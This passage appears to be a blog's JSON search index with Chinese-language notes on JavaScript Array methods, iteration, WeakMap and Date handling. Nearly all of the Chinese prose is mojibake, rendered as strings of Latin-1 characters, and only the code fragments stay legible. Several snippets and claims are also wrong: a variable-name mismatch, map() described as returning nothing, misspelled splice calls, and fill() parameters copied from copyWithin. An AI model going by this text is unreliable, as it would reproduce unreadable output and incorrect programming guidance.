è¢«å›æ”¶ï¼Œæ²¡æœ‰å®ä¾‹å¼•ç”¨DOMèŠ‚ç‚¹ï¼Œè¿™å…¶ä»DOMæ ‘åˆ é™¤åå°±å¯ä»¥ç«‹å³é‡Šæ”¾å†…å­˜let wm = new WeakMap();const fistDIV = document.querySelector('div');wm.set(firstDIV,{disable: true});firstDIV.remove()"
  },
  
  {
    "title": "2.9.åŸºæœ¬å¼•ç”¨ç±»å‹ï¼ˆArrayï¼‰",
    "url": "/posts/2.9.%E5%9F%BA%E6%9C%AC%E5%BC%95%E7%94%A8%E7%B1%BB%E5%9E%8B-Array/",
    "categories": "JavaScript, å¼•ç”¨ç±»å‹",
    "tags": "javascriptBase",
    "date": "2022-08-12 00:00:00 +0800",
    





    
    "snippet": "Array1ï¸âƒ£ æœ‰åºï¼› 2ï¸âƒ£ æ¯ä¸€ä¸ªé¡¹å¯ä»¥ä¿å­˜ä»»ä½•ç±»å‹çš„æ•°æ®ï¼› 3ï¸âƒ£ åŠ¨æ€å¤§å°ï¼Œè‡ªåŠ¨å¢é•¿åŸºæœ¬æ“ä½œ  åˆ›å»ºï¼š          new Array  å¯ä»¥å¿½ç•¥newå£°æ˜æ•°ç»„ï¼Œæ•ˆæœä¸€æ ·      ['value1', 'value2']  ä¸Objectä¸€æ ·ï¼Œä¸ä¼šè°ƒç”¨æ„é€ å‡½æ•°      Array.from(arrayLike, mapFun, thisArg)  ç±»æ•°ç»„ç»“æ„ â†’ æ•°ç»„å®ä¾‹...",
    "content": "Array1ï¸âƒ£ æœ‰åºï¼› 2ï¸âƒ£ æ¯ä¸€ä¸ªé¡¹å¯ä»¥ä¿å­˜ä»»ä½•ç±»å‹çš„æ•°æ®ï¼› 3ï¸âƒ£ åŠ¨æ€å¤§å°ï¼Œè‡ªåŠ¨å¢é•¿åŸºæœ¬æ“ä½œ  åˆ›å»ºï¼š          new Array  å¯ä»¥å¿½ç•¥newå£°æ˜æ•°ç»„ï¼Œæ•ˆæœä¸€æ ·      ['value1', 'value2']  ä¸Objectä¸€æ ·ï¼Œä¸ä¼šè°ƒç”¨æ„é€ å‡½æ•°      Array.from(arrayLike, mapFun, thisArg)  ç±»æ•°ç»„ç»“æ„ â†’ æ•°ç»„å®ä¾‹ ï¼ˆæµ…å¤åˆ¶ï¼‰                  arrayLike â€” æƒ³è¦è½¬æ¢æˆæ•°ç»„çš„ä¼ªæ•°ç»„å¯¹è±¡æˆ–å¯è¿­ä»£å¯¹è±¡                          ä¼ªæ•°ç»„å¯¹è±¡ï¼ˆæ‹¥æœ‰ä¸€ä¸ª length å±æ€§ã€å¯ç´¢å¼•å…ƒç´ ç»“æœçš„å¯¹è±¡ï¼‰              å¯è¿­ä»£å¯¹è±¡ï¼ˆSet Mapç­‰ï¼‰                                mapFun â€” [å¯é€‰] æ–°æ•°ç»„ä¸­çš„æ¯ä¸ªå…ƒç´ ä¼šæ‰§è¡Œè¯¥å›è°ƒå‡½æ•°          thisArg â€” [å¯é€‰] æ‰§è¡Œå›è°ƒå‡½æ•°mapFunæ—¶çš„thiså¯¹è±¡                    Array.of() ä¸€ç»„å‚æ•° â†’ æ•°ç»„å®ä¾‹                  ä»£æ›¿ Array.prototype.slice.call(arguments) å°†å¯¹è±¡è½¬ä¸ºæ•°ç»„çš„æ–¹æ³•                      å–å€¼ï¼šåŸºäº0å¼€å§‹çš„ æ•°å­—ç´¢å¼•  é•¿åº¦ length ï¼ˆä¸ä»…æ˜¯å¯è¯»å±æ€§ï¼‰          0 â‰¤ length      ç§»åŠ¨è‡³ length = length-1 åˆ é™¤æœ€åä¸€ä¸ªå…ƒç´       ç§»åŠ¨è‡³ length = length+1æ·»åŠ æœ€åä¸€ä¸ªå…ƒç´         åˆ¤æ–­ï¼š isArray()          ä½¿ç”¨instanceof åˆ¤æ–­æ˜¯å¦å¤„äºåŒä¸€ä¸ªç»§æ‰¿é“¾ä¸­ï¼Œåœ¨å°è£…è¿‡Arrayæ„é€ å‡½æ•°åçš„æƒ…å†µä¸‹ï¼Œæ•°ç»„ä¼šä¸ç›¸åŒ      isArray() ä¸è®ºå“ªä¸ªå…¨å±€æ‰§è¡Œä¸Šä¸‹æ–‡ä¸­åˆ›å»ºï¼Œä¹Ÿå¯èƒ½åˆ¤æ–­æ˜¯å¦ä¸ºæ•°ç»„      æ•°ç»„ç©ºä½ const options = [,,,,,]; // ä½¿ç”¨ä¸€ä¸²é€—å·æ¥åˆ›å»ºç©ºä½ES6ä¸­ï¼Œ ä¼šå°†ç©ºä½è§†ä¸º å­˜åœ¨çš„å…ƒç´ ï¼Œå€¼ä¸ºundefinedES6ä¹‹å‰ï¼Œå°†ç©ºä½å¿½ç•¥ï¼Œæˆ–è§†ä¸ºç©ºå­—ç¬¦ä¸² â€”â€” è¡Œä¸ºä¸åŒã€å­˜åœ¨ä¸å¦ï¼Œä¼šå¯¼è‡´ä¸åŒå¹³å°å‡ºç°é—®é¢˜â€‹\tå¦‚æœéœ€è¦ç©ºä½ï¼Œå¯ä»¥ç”¨æ˜¾ç¤ºçš„undefinedå€¼ä»£æ›¿æŸ¥æ‰¾ä¸¥æ ¼ç›¸ç­‰æŸ¥æ‰¾ ï¼ˆ===æ¯”è¾ƒï¼‰  indexOf('') &amp; lastIndexOf('')ï¼šä»0å¼€å§‹ï¼Œä¸å­˜åœ¨è¿”å› -1  includes('', start)ï¼š è¿”å›true / falseæ–­è¨€å‡½æ•°æŸ¥æ‰¾ï¼ˆçŸ­è·¯åˆ¤æ–­ï¼‰  find &amp; findIndexï¼šçŸ­è·¯æŸ¥æ‰¾ï¼Œä¸å­˜åœ¨è¿”å›undefinedè¿‡æ»¤  .some() &amp; every() ï¼šçŸ­è·¯éå†ï¼Œè¿”å›Boolean  filter          å¯¹äºå¼•ç”¨ç±»å‹ï¼Œè¿”å› falseï¼ˆæ¯”è¾ƒåœ°å€ï¼‰      å˜é‡æ‰€æœ‰å…ƒç´ ï¼Œè¿”å› æ–°æ•°ç»„      è¿”å›å€¼ï¼štrueï¼Œå°†currentValueåŠ å…¥æ–°æ•°ç»„ï¼›falseï¼Œè·³è¿‡currentValue      const newList = array.filter( function( currentValue, index, arr ) {\t// ...    // return currentValue % 2 === 0 è¿”å›å¶æ•°    return})// ç®­å¤´å‡½æ•°array.filter( (currentValue, index, arr) =&gt; current*2 )å¡«å…… &amp; å¤åˆ¶ğŸš© è¿æ¥ï¼š      arr.concat()                    ä¼ å€¼ï¼šæ·»åŠ åˆ°arråé¢ï¼Œè¿”å›æ–°æ•°ç»„                    ä¼ æ•°ç»„ï¼šæ•°ç»„çš„æ¯ä¸€é¡¹æ·»åŠ åˆ°arråé¢ï¼Œè¿”å›æ–°æ•°ç»„                  æ‰“å¹³ï¼šæ˜¯å»æ‰ä¸­æ‹¬å· Symbol.isConcatSpreadable                arr = ['red','green']     // ä¸æ‰“å¹³è¿½åŠ arr1 = [1,2,3]arr1[Symbol.isConcatSpreadable] = falsearr.concat('yellow',arr1) // ['red','green','yellow',[1,2,3]]     // æ‰“å¹³è¿½åŠ arr2 = [4,5,6]arr2[Symbol.isConcatSpreadable] = truearr.concat('yellow',arr2) // ['red','green','yellow',4,5,6]                          å±•å¼€è¯­æ³• arr[...arr, ...arr2]  ğŸš© å¤åˆ¶  slice(start, end) â€” æå–æŒ‡å®šä½ç½®çš„æ•°æ®ï¼Œè¿”å›ä¸€ä¸ªæ–°æ•°ç»„ï¼ˆå­—ç¬¦ä¸²ä¹Ÿå¯ç”¨ï¼‰          ç»“æŸä½ç½® &lt; å¼€å§‹ä½ç½®ï¼Œè¿”å›ç©ºæ•°ç»„        copyWithin(target, start, end)  ï¼ˆES6 æ–°å¢æ–¹æ³•ï¼‰          æµ…å¤åˆ¶æ•°ç»„ï¼ˆå¯¹è±¡å¤åˆ¶å¼•ç”¨ï¼‰ä¸€éƒ¨åˆ†åˆ°åŒä¸€æ•°ç»„ä¸­çš„å¦ä¸€ä¸ªä½ç½®ï¼Œå¹¶è¿”å›å®ƒ      å‚æ•°è¯´æ˜ï¼šå¿…é¡»ä¸ºæ•´æ•°                  targetï¼šæŒ‡å®šå¤åˆ¶åºåˆ—çš„ä½ç½®ï¼›                          è´Ÿæ•°ï¼Œä»æœ«å°¾è®¡ç®—ï¼›â‰¥arr.lenghtï¼Œä¸å‘ç”Ÿæ‹·è´              targetåœ¨startä¹‹åï¼Œå¤åˆ¶åºåˆ—å¤åˆ¶çš„åºåˆ—å°†è¢«ä¿®æ”¹ä»¥ç¬¦åˆarr.lenght                                startï¼š å¼€å§‹å¤åˆ¶å…ƒç´ çš„èµ·å§‹ä½ç½®                          è´Ÿæ•°ï¼Œä»æœ«å°¾è®¡ç®—ï¼›æ— å€¼ï¼Œä»0å¼€å§‹å¤åˆ¶                                endï¼šç»“æŸå¤åˆ¶å…ƒç´ çš„ä½ç½®                          è´Ÿæ•°ï¼Œä»æœ«å°¾å¼€å§‹è®¡ç®—ï¼›æ— å€¼ï¼Œç›´è‡³æ•°ç»„ç»“æŸ                                          ä¸ä¼šæ”¹å˜åŸæ•°ç»„çš„é•¿åº¦ï¼šè¶…è¿‡é•¿åº¦ã€é›¶é•¿åº¦ã€æ–¹å‘ç›¸åï¼Œä¸æŠ¥é”™ä¸”ä¸å¤„ç†      ğŸš© æ›¿æ¢  array.fill(value, start, end) â€”  å›ºå®šå€¼æ›¿æ¢æ•°ç»„çš„å…ƒç´           å‚æ•°è¯´æ˜ï¼šå¿…é¡»ä¸ºæ•´æ•°                  targetï¼šæŒ‡å®šå¤åˆ¶åºåˆ—çš„ä½ç½®ï¼›                          è´Ÿæ•°ï¼Œä»æœ«å°¾è®¡ç®—ï¼›â‰¥arr.lenghtï¼Œä¸å‘ç”Ÿæ‹·è´              targetåœ¨startä¹‹åï¼Œå¤åˆ¶åºåˆ—å¤åˆ¶çš„åºåˆ—å°†è¢«ä¿®æ”¹ä»¥ç¬¦åˆarr.lenght                                startï¼š å¼€å§‹å¤åˆ¶å…ƒç´ çš„èµ·å§‹ä½ç½®                          è´Ÿæ•°ï¼Œä»æœ«å°¾è®¡ç®—ï¼›æ— å€¼ï¼Œä»0å¼€å§‹å¤åˆ¶                                endï¼šç»“æŸå¤åˆ¶å…ƒç´ çš„ä½ç½®                          è´Ÿæ•°ï¼Œä»æœ«å°¾å¼€å§‹è®¡ç®—ï¼›æ— å€¼ï¼Œç›´è‡³æ•°ç»„ç»“æŸ                                          ä¸ä¼šæ”¹å˜åŸæ•°ç»„çš„é•¿åº¦ï¼šè¶…è¿‡é•¿åº¦ã€é›¶é•¿åº¦ã€æ–¹å‘ç›¸åï¼Œä¸æŠ¥é”™ä¸”ä¸å¤„ç†      ğŸš© splic(start, delectNum, end) ï¼Œ æ”¹å˜åŸæ•°ç»„ï¼Œè¿”å›å¤„ç†åçš„æ•°ç»„      åˆ é™¤ splice(start, num) è¿”å›åˆ é™¤[start],[start+1]â€¦[start+num]ï¼Œæ— åˆ é™¤çš„æ•°æ®è¿”å›ç©ºæ•°ç»„        æ’å…¥ splice(start,0,interItem) ä»å¼€å§‹ä½ç½®ï¼Œåˆ é™¤0é¡¹ï¼Œæ’å…¥æ•°æ®        æ›¿æ¢ splict(start,num,iterItem)  è½¬æ¢  å­—ç¬¦ä¸²è½¬ä¸ºæ•°ç»„ â€” å­—ç¬¦ä¸²å…·æœ‰lengthå±æ€§          str.split(â€˜æŒ‡å®šæ‹†åˆ†ç¬¦â€™)      arr.from(str, mapFun)      ...\"abcd\" == ['a','b','c','d']        æ•°ç»„è½¬ä¸ºå­—ç¬¦ä¸²          toString()ã€valueOf()ã€alert() â€” ä¸ºæ•°ç»„æ¯ä¸€é¡¹è°ƒç”¨ toString()      toLocaleString() â€” æ¯ä¸€é¡¹è°ƒç”¨toLocalString()      join(\"æŒ‡å®šè¿æ¥ç¬¦\") â€” æŸä¸€é¡¹æ˜¯nullã€undefindï¼Œè¿”å›ç»“æœæ˜¯ä»¥ç©ºå­—ç¬¦ä¸²è¡¨ç¤º        å¯¹è±¡è½¬ä¸ºæ•°ç»„          ä¸ºå¯¹è±¡æ·»åŠ lengthå±æ€§ï¼Œkeyå€¼æ”¹ä¸ºæ•°ç»„ä¸‹æ ‡ç›¸åŒ      æ ˆé˜Ÿæ–¹æ³•  æ ˆ          pushæ¨å…¥ â€” æ¥å—ä»»æ„æ•°é‡çš„å‚æ•°ï¼Œé€ä¸ªæ·»åŠ åˆ°æœ«å°¾ï¼Œè¿”å›ä¿®æ”¹åçš„æ•°ç»„é•¿åº¦      popå¼¹å‡º â€” ç§»é™¤æœ«å°¾æœ€åä¸€é¡¹ï¼Œå‡å°‘lengthå€¼ï¼Œè¿”å›ç§»é™¤é¡¹        é˜Ÿ          push + shift â€” ç§»é™¤ç¬¬ä¸€é¡¹ï¼Œå‡å°‘lengthå€¼ï¼Œè¿”å›ç§»é™¤é¡¹      pop + unshift â€” å‰ç«¯æ·»åŠ ä»»æ„é¡¹ï¼Œè¿”å›æ•°ç»„é•¿åº¦ï¼Œ åæ–¹å‘æ¨¡æ‹Ÿé˜Ÿåˆ—        å±•å¼€è¯­æ³•ï¼š array = [...array,...hd];é‡æ’åºâ€‹\téƒ½è¿”å›è°ƒç”¨æ•°å€¼çš„å¼•ç”¨  reverse() ï¼š åè½¬æ•°ç»„é¡¹é¡ºåº  sort() : å‡åºæ’åˆ—æ•°ç»„é¡¹          é»˜è®¤æƒ…å†µä¸‹ï¼Œè°ƒç”¨æ¯é¡¹çš„toString()ï¼Œæ¯”è¾ƒå¾—åˆ°çš„å­—ç¬¦ä¸²ï¼Œæ‰€ä»¥å¯èƒ½å‡ºç°$ 10&lt;5 $ çš„æƒ…å†µ      å¯ä»¥ æ¥å—ä¸€ä¸ªæ¯”è¾ƒå‡½æ•°ä½œä¸ºå‚æ•°ï¼š      // æ¯”è¾ƒå€¼ä¸ºå­—ç¬¦ä¸²// a&lt;b -1, aåœ¨å‰é¢ï¼› a&gt;b 1,aåœ¨åé¢ï¼›a=b 0,abç›¸ç­‰value.sort((a,b) =&gt; a &lt; b? 1 : a &gt; b? -1: 0)// æ¯”è¾ƒå€¼ä¸ºæ•°å€¼value.sort((a,b) =&gt; b-a)å¾ªç¯1. forfor(let i = 0; i &lt; arr.length; i++){}â€‹\tåŒç†ï¼Œè¿˜æœ‰whileã€doâ€¦whileï¼Œå¸¸ç”¨äºæ•°ç»„éå†2. for â€¦ inlet obj = {name:'zhou',age:'**'}for(let i in obj) { console.log(i, obj[i])}  i æ˜¯å¯¹è±¡çš„keyå€¼ï¼Œæ˜¯å­—ç¬¦ä¸²å½¢å¼ï¼Œå¯èƒ½ä¼šå‘ç”Ÿ å­—ç¬¦ä¸²è¿ç®—  ä¸ä»…ä»…éå†è‡ªèº«å±æ€§ï¼Œè¿˜ä¼šæ‰¾prototypeä¸Šçš„å±æ€§ï¼›åŠ åˆ¤æ–­obj[i].hasOwnProperty(i)ï¼Œå¦åˆ™ä¸éå†3. forEacharr.forEach(function(item, index),this){}let arr = [1,2,3];arr.forEach(function(i,index){ console.log(i,index)})  æ²¡æœ‰è¿”å›å€¼  ä¸èƒ½ä¸­æ–­éå†ï¼ˆæ²¡æœ‰breakè¯­å¥ï¼‰ï¼›ä½¿ç”¨try...catch{return}è¿”å›  åªèƒ½éå†æ•°ç»„ï¼Œä¸èƒ½éå†æ™®é€šå¯¹è±¡4. maparr.map(function(item, index, arr),this){}//item\t[å¿…é¡»],å½“å‰éå†é¡¹//index\t[å¯é€‰],å½“å‰éå†é¡¹çš„ä¸‹æ ‡//arr\t[å¯é€‰],å½“å‰å…ƒç´ æ‰€å±çš„æ•°ç»„å¯¹è±¡let arr = [1,2,3];let tt = arr.map(function(i){ console.log(i) return i*2;})  ã€ä¸forEachä¸€æ ·ã€‘æ²¡æœ‰è¿”å›å€¼  ä¸èƒ½ä¸­æ–­éå†ï¼ˆæ²¡æœ‰breakè¯­å¥ï¼‰ï¼›ä½¿ç”¨try...catch{return}è¿”å›  åªèƒ½éå†æ•°ç»„ï¼Œä¸èƒ½éå†æ™®é€šå¯¹è±¡5. filterâ€‹\tå¯¹äºå¼•ç”¨ç±»å‹çš„æ¯”è¾ƒï¼Œè¿”å›falseï¼Œå› ä¸ºæ¯”è¾ƒçš„æ˜¯å¼•ç”¨åœ°å€â€‹\tå›è°ƒå‡½æ•°ä¸­ï¼Œè¿”å›å€¼ä¸º trueï¼ŒcurrentValueå°†åŠ å…¥æ–°æ•°ç»„ï¼›falseï¼Œè·³è¿‡currentValuearr.filiter(function(item, index, arr){    // ...    // return currentValue % 2 === 0 è¿”å›å¶æ•°    return})let arr = [1,2,3];let tt = arr.filter(function(i) =&gt; i &gt; 1)// [2,3]  æ•°ç»„çš„å†…ç½®æ–¹æ³•ï¼Œè¿”å›é€šè¿‡è¿‡æ»¤çš„å…ƒç´ ç»„æˆçš„æ–°æ•°ç»„ï¼Œä¸æ”¹å˜åŸæ•°ç»„6. some &amp; everylet arr = [1,2,3];// ã€someã€‘let tt = arr.some(function(i){ return i&gt;1;})// true, å­˜åœ¨ä¸€ä¸ªå°±ä¸ºtrueï¼ŒçŸ­è·¯åˆ¤æ–­// ã€everyã€‘let tt = arr.every(function(i){ return i&gt;1;})// false, ä»»æ„ä¸€ä¸ªéƒ½éœ€è¦æ»¡è¶³ï¼Œå¦åˆ™ä¸ºfalseï¼ŒçŸ­è·¯åˆ¤æ–­7.  reduce &amp; reduceRightarr.reduce(function(pre, cur, index, arr){}, this){}//pre\t[å¿…é¡»] åˆå§‹å€¼ï¼Œè®¡ç®—ç»“æŸåè¿”å›çš„å€¼ï¼Œä¸”ä½œä¸ºä¸‹æ¬¡å¾ªç¯è°ƒç”¨çš„ç¬¬ä¸€ä¸ªå‚æ•°//cur\t[å¿…é¡»] å½“å‰å…ƒç´ //index\t[å¯é€‰] å½“å‰å…ƒç´ çš„ä¸‹æ ‡//arr\t[å¯é€‰] å½“å‰å…ƒç´ æ‰€å±çš„æ•°ç»„//this\t[å¯é€‰]let arr = [1,2,3];let ad = arr.reduce(function(i,j){ return i+j;     //å°±æ˜¯è®¡ç®—ä»å·¦åˆ°å³ 1+2+3})// 6  reduceï¼ˆä»å·¦åˆ°å³ï¼‰è®¡ç®—æ•°ç»„ä¸­çš„æ¯ä¸€ä¸ªå€¼ï¼Œæœ€ç»ˆè®¡ç®—ä¸ºä¸€ä¸ªå€¼ã€‚  reduceRight ï¼ˆä»å³åˆ°å·¦ï¼‰8. for â€¦ offor (variable of iterable) {    //statements}  å¯è¿­ä»£å¯¹è±¡ï¼ˆåŒ…æ‹¬ Arrayï¼ŒMapï¼ŒSetï¼ŒStringï¼ŒTypedArrayï¼Œarguments å¯¹è±¡ç­‰ç­‰ï¼‰ä¸Šåˆ›å»ºä¸€ä¸ªè¿­ä»£å¾ªç¯ï¼Œè°ƒç”¨è‡ªå®šä¹‰è¿­ä»£é’©å­ï¼Œå¹¶ä¸ºæ¯ä¸ªä¸åŒå±æ€§çš„å€¼æ‰§è¡Œè¯­å¥ 9. è¿­ä»£å™¨ iteratorâ€‹\tè¡¨ç¤ºâ€é›†åˆâ€çš„æ•°æ®ç»“æ„ï¼Œæœ‰ä¸€ä¸ªç»Ÿä¸€çš„æ¥å£æœºåˆ¶å®Œæˆéå†æ“ä½œï¼ˆä¾æ¬¡å¤„ç†è¯¥æ•°æ®ç»“æ„çš„æ‰€æœ‰æˆå‘˜ï¼‰ï¼Œå«åšIteratoræ¥å£ã€‚  è¿­ä»£å™¨å¯¹è±¡çš„æœ¬è´¨æ˜¯ä¸€ä¸ª æŒ‡é’ˆå¯¹è±¡ï¼Œä½¿ç”¨.next()ç§»åŠ¨æŒ‡é’ˆï¼Œä¼šæœ‰ä¸¤ä¸ªç»“æœ          ä¸‹ä¸€é¡¹ï¼Œè¿”å›å¯¹è±¡                  å½“å‰æˆå‘˜æ•°æ®ä¿¡æ¯(value)          æ˜¯å¦å®Œæˆéå†(done â€” Boolean)          value:undefined + done:fale  éƒ½æ˜¯å¯ä»¥çœç•¥çš„                    å¼•èµ·stopiteration å¼‚å¸¸        Iteratoræ¥å£åœ¨ES6è§„å®šä¸­ï¼Œå®šä¹‰åœ¨Symbol.iteratorä¸Š          å…·æœ‰è¿™ä¸ªiteratoå±æ€§ï¼Œå¯ä»¥è®¤ä¸ºæ˜¯â€å¯éå†çš„â€      è°ƒç”¨Symbol.iteratorä¼šå¾—åˆ°å½“å‰æ•°æ®ç»“æ„é»˜è®¤çš„éå†å™¨ç”Ÿæˆçš„å‡½æ•°      Symbol.iteratoræœ¬èº«æ˜¯ä¸€ä¸ªè¡¨è¾¾å¼ï¼Œè¿”å›iteratorå±æ€§      while( ({value, done} = values.next())  &amp;&amp; done === false) {}// ({value, done} = values.next()) åœ¨æ‹¬å·å†…ï¼Œå…ˆæ‰§è¡Œï¼Œè·å¾—doneï¼Œåˆ¤æ–­æ˜¯å¦å·²ç»å®Œæˆè¿­ä»£ï¼Œé¿å…æ­»å¾ªç¯10.è¿­ä»£å™¨ entriesâ€‹\tObject.entries(obj)æ–¹æ³•  å°†ä¸€ä¸ªç»™å®šå¯¹è±¡objè‡ªèº«ï¼Œå¯æšä¸¾å±æ€§çš„é”®å€¼å¯¹ä»¥æ•°ç»„çš„å½¢å¼è¿”å›å‡ºæ¥ï¼Œ  å…¶æ’åˆ—ä¸ä½¿ç”¨ for...in å¾ªç¯éå†è¯¥å¯¹è±¡æ—¶è¿”å›çš„é¡ºåºä¸€è‡´  ï¼ˆåŒºåˆ«åœ¨äº for-in å¾ªç¯è¿˜ä¼šæšä¸¾åŸå‹é“¾ä¸­çš„å±æ€§ï¼‰è€Œentriesä¸ä¼šã€‚const obj = {'a':'3',b:'39'};let objEntries = Object.entries(obj); //[ [ 'a', '3' ], [ 'b', '39' ] ]const arr = [2,9,38,30]console.log(Object.entries(arr)); //[ [ '0', 2 ], [ '1', 9 ] ]Array.prototype.entries()æ–¹æ³•  è¿”å›ä¸€ä¸ªæ–°çš„Arrayè¿­ä»£å™¨å¯¹è±¡Array Iteratorå¯¹è±¡ï¼Œè¯¥å¯¹è±¡åŒ…å«æ•°ç»„ä¸­æ¯ä¸ªç´¢å¼•çš„é”®/å€¼å¯¹  Object [Array Iterator] {}  Array IteratoråŸå‹æ˜¯æœ‰ä¸€ä¸ªnextæ–¹æ³•ï¼Œå¯ä»¥ç”¨äºéå†è¿­ä»£å™¨å–å¾—çš„åŸæ•°ç»„çš„[key, value]const arr = [2,9]// Array.prototype.entries() let entries = arr.entries(); // è¿”å›Object [Array Iterator] {}let {done, value} = entries.next(); // { value: [ 1, 9 ], done: false }// æ•°ç»„éå†å¾ªç¯for(const [key,value] of arr.entries()){    console.log(`${key}+${value}`);    //0+2 1+9}æ¸…ç©ºæ•°ç»„  splice(0, arr.length) â€” ä»é›¶å¼€å§‹ï¼Œåˆ é™¤è‡³æœ€åä¸€ä¸ª  arr.length == 0          == lenght+2ï¼Œ å¤šå‡ºæ¥çš„2ä¸ªå…ƒç´  ï¼Œèµ‹å€¼ä¸ºundefined      == lenght-2ï¼Œå‡å°‘çš„2ä¸ªå…ƒç´ ï¼Œåé¢çš„2ä¸ªå…ƒç´ è¢«åˆ é™¤        arr = [] â€” é‡ç½®å¼•ç”¨ï¼Œä¹‹å‰çš„æ•°ç»„ç­‰å¾…åƒåœ¾å›æ”¶  while(arr.pop()) â€” é0çš„å€¼ï¼Œéƒ½ä¸ºtrueTyped Array"
  },
  
  {
    "title": "2.7.åŸºæœ¬å¼•ç”¨ç±»å‹ï¼ˆDateï¼‰",
    "url": "/posts/2.7.%E5%9F%BA%E6%9C%AC%E5%BC%95%E7%94%A8%E7%B1%BB%E5%9E%8B-Date/",
    "categories": "JavaScript, å¼•ç”¨ç±»å‹",
    "tags": "javascriptBase",
    "date": "2022-08-10 00:00:00 +0800",
    





    
    "snippet": "æ—¥æœŸ Dateâ€‹\t\tDateç±»å‹å°†æ—¥æœŸä¿å­˜ä¸º è‡ªåè°ƒä¸–ç•Œæ—¶ï¼ˆUTCï¼ŒUNiversal Time Coordinatedï¼‰ï¼š1970å¹´1æœˆ1æ—¥00æ—¶è‡³ä»Šæ‰€ç»å†çš„æ¯«ç§’æ•°ã€‚      åˆ›å»º          new Date â€” â‘ æ— å‚æ•°ï¼Œè·å–åˆ›å»ºæ—¶æ—¥æœŸæ—¶é—´ï¼›â‘¡æˆ–ä¼ é€’æ—¥æœŸ æ—¶é—´çš„ æ¯«ç§’æ•°        è‹¥æƒ³ä¼ å…¥æŒ‡å®šæ—¥æœŸçš„å€¼ï¼Œè€Œä¸æ˜¯æ¯«ç§’æ•°ï¼Œæœ‰ä¸¤ä¸ªè¾…åŠ©å‡½æ•°ï¼š          Date.parse(...",
    "content": "æ—¥æœŸ Dateâ€‹\t\tDateç±»å‹å°†æ—¥æœŸä¿å­˜ä¸º è‡ªåè°ƒä¸–ç•Œæ—¶ï¼ˆUTCï¼ŒUNiversal Time Coordinatedï¼‰ï¼š1970å¹´1æœˆ1æ—¥00æ—¶è‡³ä»Šæ‰€ç»å†çš„æ¯«ç§’æ•°ã€‚      åˆ›å»º          new Date â€” â‘ æ— å‚æ•°ï¼Œè·å–åˆ›å»ºæ—¶æ—¥æœŸæ—¶é—´ï¼›â‘¡æˆ–ä¼ é€’æ—¥æœŸ æ—¶é—´çš„ æ¯«ç§’æ•°        è‹¥æƒ³ä¼ å…¥æŒ‡å®šæ—¥æœŸçš„å€¼ï¼Œè€Œä¸æ˜¯æ¯«ç§’æ•°ï¼Œæœ‰ä¸¤ä¸ªè¾…åŠ©å‡½æ•°ï¼š          Date.parse() â€” æ¥å—å­—ç¬¦ä¸²                  æ ¼å¼ï¼š â‘ \"mouth/day/year\" â‘¡mouthEnglish day,year â‘¢weekEnglish mouthEnglish day year h:m:s æ—¶åŒº           ç›´æ¥ä¼  å­—ç¬¦ä¸²ç»™Date(â€œMay 22,22â€)ä¹Ÿä¼šè°ƒç”¨Date.parse()          å­—ç¬¦ä¸²ä¸èƒ½ä»£è¡¨æ—¥æœŸï¼Œè¿”å›NaN                    Date.UTC(year, mouth, [day, h, m, s, ms]) â€” åŸºäºæœ¬åœ°æ—¶åŒº                  å¹´ä»½ã€æœˆä»½ä¸ºå¿…é¡»          æœˆä»½ä»0å¼€å§‹ï¼Œæ—¥æœŸä»1å¼€å§‹ï¼Œå°æ—¶ä»0å¼€å§‹                      åˆ›å»ºä¸€ä¸ªæ–°Dateå¯¹è±¡çš„å”¯ä¸€æ–¹æ³•æ˜¯é€šè¿‡new æ“ä½œç¬¦ï¼Œä¾‹å¦‚ï¼šlet now = new Date(); è‹¥å°†å®ƒä½œä¸ºå¸¸è§„å‡½æ•°è°ƒç”¨ï¼ˆå³ä¸åŠ  new æ“ä½œç¬¦ï¼‰ï¼Œå°†è¿”å›ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œè€Œé Date å¯¹è±¡ã€‚  const time = new Date();console.log(typeof time); //Objectconsole.log(time * 1);\t// æ—¶é—´æˆ³const time1 = Date()console.log(typeof time1); //stringconsole.log(time1 * 1);\t// NaN  å…¶ä»–æ“ä½œ            è½¬åŒ–ä¸ºå­—ç¬¦ä¸²      Â       Â       Â                   Â       æ™®é€šå­—ç¬¦ä¸²      ç³»ç»ŸåŒºåŸŸè®¾ç½®æ ¼å¼      ç‰¹æ®Šåœ°åŒºæ—¶é—´              æ—¥æœŸ      toDateString()      toLocalDateString()      toUTCString() å…¨çƒæ ‡å‡†æ—¶é—´              æ—¶é—´      toTimeString()      toLocalTimeString()      toGMTString() æ ¼æ—å¨æ²»æ—¶é—´      â€‹\tä»¥ä¸Šæ–¹æ³•è¾“å‡ºçš„æ—¶é—´æ ¼å¼å› æµè§ˆå™¨è€Œå¼‚ï¼Œä¸èƒ½ç”¨äºåœ¨ç”¨æˆ·ç•Œé¢ä¸Šä¸€è‡´åœ°æ˜¾ç¤ºæ—¥æœŸ            è½¬ä¸ºæ—¶é—´æˆ³      Â                   æ ‡å‡†æ—¶é—´å¯¹è±¡ * 1      Number(æ ‡å‡†æ—¶é—´å¯¹è±¡)              æ ‡å‡†æ—¶é—´å¯¹è±¡.valueOf()      æ ‡å‡†æ—¶é—´å¯¹è±¡.gerTime()      æ—¶é—´æˆ³è½¬ä¸ºæ ‡å‡†æ—¶é—´å¯¹è±¡ â€” new Date(æ—¶é—´æˆ³)  toString å’Œ toLocaleString çš„åŒºåˆ«  1.å½“æ•°å­—æ˜¯å››ä½æ•°åŠä»¥ä¸Šæ—¶ï¼Œæœ‰åŒºåˆ«  â€‹\ttoLocaleString()ä¼šè®©æ•°å­—ä¸‰ä½ä¸‰ä½ä¸€åˆ†éš”  2.å½“ç›®æ ‡æ˜¯æ ‡å‡†æ—¶é—´æ ¼å¼æ—¶ï¼Œæœ‰åŒºåˆ«  sd.toLocaleString()â€œ2017/2/15 ä¸Šåˆ11:21:31â€  sd.toString()â€œWed Feb 15 2017 11:21:31 GMT+0800 (CST)â€  æŸ¥è¯¢è„šæœ¬æ‰§è¡Œæ—¶é—´  å®šä¹‰æ ‡å¿—ä½ï¼šconsole.time(â€œforâ€)  å®šä¹‰ç»“æŸæ ‡å¿—ä½ï¼š console.timeEnd(â€œforâ€)æ ¼å¼åŒ–æ—¶é—´å¯¹è±¡function dateFormat(date, format = 'YYYYå¹´MMæœˆDDæ—¥ HH:mm:ss'){    const config = {        YYYY: date.getFullYear(),        MM: date.getMonth(),        DD: date.getDate(),        HH: date.getHours(),        mm: date.getMinutes(),        ss: date.getSeconds()    };    for(const key in config){        format = format.replace(key, config[key]);    }    console.log(format);    return format;}const time = new Date();let time3 = dateFormat(time)   // 2022å¹´7æœˆ30æ—¥ 